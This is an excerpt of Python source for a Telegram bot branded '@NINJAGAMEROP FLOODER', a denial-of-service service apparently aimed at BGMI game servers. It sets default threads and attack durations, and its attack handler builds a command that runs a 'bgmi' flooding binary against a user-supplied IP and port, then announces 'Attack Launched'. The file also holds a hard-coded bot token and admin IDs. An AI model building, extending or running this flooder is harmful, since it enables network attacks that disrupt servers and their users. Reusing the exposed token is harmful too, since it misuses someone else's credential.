...
TELEGRAM_BOT_TOKEN = '8058370192:AAErXXSNYFnjjQrNNTKVV37dpuHX1r35a3U'
ADMIN_IDS = [1240179115, 6662804820, ]
...
DEFAULT_BYTE_SIZE = 13
DEFAULT_THREADS = 600
DEFAULT_MAX_ATTACK_TIME = 240

LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
PROTECTED_FILES = ["ninja3.py", "bgmi"]
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*😒WELCOME TO @NINJAGAMEROP FLOODER😒*\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./bgmi {ip} {port} {duration} {300} {1000}"
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 THIS IS @NINJAGAMEROP FLOODER!...... 💥*"
    ), parse_mode='Markdown')
